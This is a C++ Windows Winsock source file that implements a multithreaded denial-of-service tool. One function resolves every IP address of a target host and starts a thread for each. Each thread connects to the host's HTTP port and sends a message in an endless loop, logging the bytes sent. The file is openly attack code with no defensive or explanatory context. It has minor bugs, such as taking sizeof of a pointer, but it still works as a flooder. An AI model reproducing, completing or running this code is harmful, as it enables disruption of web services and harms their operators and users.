#include <WinSock2.h>
#include <mutex>
#include <Windows.h>
#include <thread>
#include <iostream>
#include <vector>
#include <WS2tcpip.h>
#include <algorithm>
#include "thread_functions.h"
#pragma warning(disable: 4996)

void make_dos_overthread(HOSTENT remote_host, std::mutex& out_obj, char* message, int num)
{
	WSADATA filler;

	if (WSAStartup(0x0202, &filler))
	{
		out_obj.lock();
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cerr << "WSA was not initialized: " << WSAGetLastError() << std::endl;
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
		out_obj.unlock();

		WSACleanup();

		return;
	}

	sockaddr_in server;
	std::vector<std::thread> threads;

	server.sin_family = AF_INET;
	server.sin_port = htons(HTTP);

	for (int i = 0; remote_host.h_addr_list[i]; i++)
	{
		in_addr temp;
		temp.s_addr = *(u_long*)remote_host.h_addr_list[i];
		inet_pton(AF_INET, (PCSTR)inet_ntoa(temp), &server.sin_addr);
		threads.push_back(std::thread(make_dos_underthread, server, ref(out_obj), message));
	}

	std::for_each(threads.begin(), threads.end(), std::mem_fn(&std::thread::join));
}

void make_dos_underthread(sockaddr_in server, std::mutex& out_obj, char* message)
{
	WSADATA filler;

	if (WSAStartup(0x0202, &filler))
	{
		out_obj.lock();
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cerr << "WSA was not initialized: " << WSAGetLastError() << std::endl;
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
		out_obj.unlock();

		WSACleanup();

		return;
	}

	SOCKET DoSer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (!DoSer)
	{
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
		out_obj.lock();
		std::cerr << "DoS socket is invalid" << std::endl;

		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
		out_obj.unlock();

		WSACleanup();

		return;
	}

	if (connect(DoSer, (SOCKADDR*)&server, sizeof(server)))
	{
		out_obj.lock();
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cerr << "Connection error: " << WSAGetLastError() << std::endl << "Can't connect to " 
			<< inet_ntoa(server.sin_addr) << std::endl;

		if (closesocket(DoSer))
		{
			std::cerr << "Closing error: " << WSAGetLastError() << std::endl;
		}

		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
		out_obj.unlock();

		WSACleanup();

		return;
	}
	else
	{
		out_obj.lock();
		std::cout << "The coonection to " << inet_ntoa(server.sin_addr) << " established" << std::endl;
		out_obj.unlock();
	}

	int sended;

	while(true)
	{
		sended = send(DoSer, message, sizeof(message), 0);
		if (sended > SOCKET_ERROR)
		{
			out_obj.lock();
			std::cout << "thread id: " << std::this_thread::get_id() << " to: " << inet_ntoa(server.sin_addr) << " sended: " << sended << " bytes" << std::endl;
			out_obj.unlock();
		}
		else
		{
			out_obj.lock();
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
			std::cerr << "thread id: " << std::this_thread::get_id() << " to: " << inet_ntoa(server.sin_addr) << " sended: " << sended << " bytes" << std::endl;
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
			out_obj.unlock();
		}
	}
}
